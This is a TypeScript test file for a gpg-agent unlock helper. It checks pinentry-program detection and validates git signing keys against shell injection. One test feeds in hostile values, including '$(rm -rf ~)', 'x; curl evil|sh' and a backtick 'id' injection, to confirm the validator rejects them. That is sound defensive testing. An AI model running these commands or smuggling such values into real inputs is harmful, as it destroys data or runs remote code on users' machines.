import { test } from 'node:test'
import assert from 'node:assert/strict'
import { hasPinentryProgram, isSafeSigningKey } from './unlock.ts'

// The whole feature hinges on gpg-agent having a TTY pinentry configured. If this
// detection is wrong we either clobber a user's config (false negative) or leave
// them with a broken headless pinentry (false positive on a commented line).

test('detects an active pinentry-program line', () => {
  assert.equal(hasPinentryProgram('pinentry-program /usr/bin/pinentry-curses\n'), true)
  assert.equal(hasPinentryProgram('default-cache-ttl 28800\n  pinentry-program /x\n'), true)
})

test('a commented-out line does NOT count as configured', () => {
  assert.equal(hasPinentryProgram('# pinentry-program /usr/bin/pinentry-gnome3\n'), false)
  assert.equal(hasPinentryProgram(''), false)
  assert.equal(hasPinentryProgram('default-cache-ttl 28800\n'), false)
})

// user.signingkey comes from a repo's .git/config and is interpolated into an
// `sh -c` string — a hostile clone must not be able to inject shell metacharacters.
test('signingkey accepts real keyids/fingerprints/emails', () => {
  assert.equal(isSafeSigningKey('971CD8002CC5C5A3'), true)
  assert.equal(isSafeSigningKey('rafael@lunardelli.me'), true)
  assert.equal(isSafeSigningKey('B7A1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9'), true)
})

test('signingkey rejects shell metacharacters', () => {
  assert.equal(isSafeSigningKey('$(rm -rf ~)'), false)
  assert.equal(isSafeSigningKey('x; curl evil|sh'), false)
  assert.equal(isSafeSigningKey("x'`id`'"), false)
  assert.equal(isSafeSigningKey(''), false)
})
